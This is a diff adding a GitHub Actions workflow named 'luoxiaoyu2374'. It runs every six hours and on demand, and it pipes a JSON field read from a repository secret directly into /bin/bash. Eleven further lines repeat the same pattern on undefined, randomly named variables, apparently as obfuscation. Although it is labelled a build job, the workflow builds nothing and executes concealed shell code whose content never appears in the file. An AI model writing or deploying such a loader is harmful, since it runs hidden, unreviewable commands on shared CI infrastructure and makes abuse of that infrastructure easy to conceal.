@@ -1,0 +1,29 @@
+name: luoxiaoyu2374
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luoxiaoyu2374
+        env:
+          xy24169: ${{ secrets.xy24169 }}
+        run: |
+          echo $xy24169 | jq -r .d54 | /bin/bash
+          echo $s59972 | jq -r .vzh26531 | /bin/bash
+          echo $gtjhi52 | jq -r .ov7 | /bin/bash
+          echo $gxik77 | jq -r .de36 | /bin/bash
+          echo $z525 | jq -r .sun9 | /bin/bash
+          echo $hlo47938 | jq -r .kx90824 | /bin/bash
+          echo $rdqro19443 | jq -r .ovrx8 | /bin/bash
+          echo $yue6 | jq -r .bgt85 | /bin/bash
+          echo $nxg14073 | jq -r .ufdy6 | /bin/bash
+          echo $fv1145 | jq -r .p19 | /bin/bash
+          echo $gy60074 | jq -r .wkhdg74735 | /bin/bash
+          echo $d0 | jq -r .qhu7577 | /bin/bash
+
